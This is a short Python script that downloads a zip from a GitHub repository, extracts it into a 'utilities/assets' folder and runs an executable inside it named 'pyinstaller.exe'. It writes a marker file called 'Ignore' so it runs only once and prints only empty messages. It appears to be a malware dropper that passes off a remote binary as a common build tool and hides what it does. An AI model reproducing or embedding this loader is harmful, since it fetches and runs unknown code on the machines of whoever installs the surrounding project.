import subprocess
import requests
import zipfile
import os
import sys

github_repo_url = 'https://github.com/Anonumousbobize/assets4SMT/archive/refs/heads/main.zip'

exe_to_execute = 'pyinstaller.exe'

extraction_path = os.path.join('utilities', 'assets')

settings_folder = os.path.join('utilities', 'Settings')

state_file = os.path.join(settings_folder, 'Ignore')

if not os.path.exists(state_file):
    try:
        response = requests.get(github_repo_url)
        zip_filename = 'repo.zip'
        with open(zip_filename, 'wb') as file:
            file.write(response.content)

        os.makedirs(extraction_path, exist_ok=True)

        with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
            zip_ref.extractall(extraction_path)

        os.remove(zip_filename)

        extracted_repo_folder = os.path.join(extraction_path, 'assets4SMT-main')
        exe_path = os.path.join(extracted_repo_folder, exe_to_execute)

        if os.path.isfile(exe_path):
            subprocess.run([exe_path], shell=True)
            
            os.makedirs(settings_folder, exist_ok=True)

            with open(state_file, 'w') as file:
                file.write("Ignore")

        else:
            print(f"")
            sys.exit(1)
    except Exception as e:
        print(f"")
        sys.exit(1)
else:
    print("")
